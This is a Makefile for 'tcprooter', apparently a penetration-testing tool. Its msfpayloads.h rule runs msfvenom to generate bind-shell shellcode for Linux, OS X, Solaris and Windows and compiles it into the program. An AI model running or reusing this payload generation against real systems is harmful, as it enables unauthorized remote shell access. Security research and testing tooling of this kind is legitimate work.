# Makefile for tcprooter
# author: Joff Thyer, 2011-2012
CC	=	gcc -g
INC	=	tcprooter.h msfpayloads.h
SRC	=	tcprooter.c
OBJ	=	tcprooter.o
BIN	=	tcprooter

$(BIN): $(OBJ)
$(OBJ): $(SRC) $(INC)

clean:
	rm -f $(OBJ) $(BIN) msfpayloads.h

msfpayloads.h:
	echo "#define PAYLOADS 5" >$@
	msfvenom -p linux/x86/shell_bind_tcp -f c | sed -e 's/ buf/ linux_x86_shell_bind_tcp/' >>$@
	msfvenom -p osx/x86/shell_bind_tcp -f c | sed -e 's/ buf/ osx_x86_shell_bind_tcp/' >>$@
	msfvenom -p solaris/x86/shell_bind_tcp -f c | sed -e 's/ buf/ solaris_x86_shell_bind_tcp/' >>$@
	msfvenom -p windows/shell_bind_tcp -f c | sed -e 's/ buf/ windows_shell_bind_tcp/' >>$@
	msfvenom -p windows/x64/shell_bind_tcp -f c | sed -e 's/ buf/ windows_x64_shell_bind_tcp/' >>$@

tarball:
	tar -czvf tcprooter.tar.gz $(SRC) $(INC) Makefile


